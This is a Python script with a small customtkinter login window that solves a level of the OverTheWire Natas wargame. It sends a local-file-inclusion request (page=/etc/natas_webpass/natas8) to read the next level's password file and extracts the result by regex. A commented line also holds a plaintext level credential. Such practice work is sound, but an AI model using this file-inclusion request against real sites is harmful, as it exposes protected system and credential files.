#!/usr/bin/env python

import requests
import re
#username = 'natas7'
#password = 'jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr'
global usernm
global passwd
usernm = 'wrong'
passwd = 'creds'


"""———————————————————————————————————————"""


import customtkinter
customtkinter.set_appearance_mode("System")
customtkinter.set_default_color_theme("dark-blue")
app = customtkinter.CTk()
app.geometry("500x350")
app.title("GUI Level nasas7.py")

frame = customtkinter.CTkFrame(master=app)
frame.pack(pady=20, padx=60, fill="both", expand="True")
label = customtkinter.CTkLabel(master=frame, text="Login System", font=("Roboto Mono", 24))
label.pack(pady=12, padx=10)

usernm = customtkinter.CTkEntry(master=frame, placeholder_text="Username")
usernm.pack(pady=12, padx=10)

passwd = customtkinter.CTkEntry(master=frame, placeholder_text="Password", show="*")
passwd.pack(pady=12, padx=10)

def login():
        global usernm
        usernm = usernm.get()
        global passwd
        passwd = passwd.get()

        #URL goes here because it needs the above
        url = 'http://%s.natas.labs.overthewire.org' % usernm

        #make sure this gets the stuff
        print(usernm, passwd)

        response = requests.get(url + "/index.php?page=/etc/natas_webpass/natas8", auth = (usernm, passwd))
        content = response.text
        print(content) 

        #classic regexing
        print(re.findall('<br>\n(.*)\n\n', content))

button = customtkinter.CTkButton(master=frame, text="Login", command=login)
button.pack(pady=12, padx=10)

checkbox = customtkinter.CTkCheckBox(master=frame, text="Remeber Me")
checkbox.pack(pady=12, padx=10)

app.mainloop()


"""SDG"""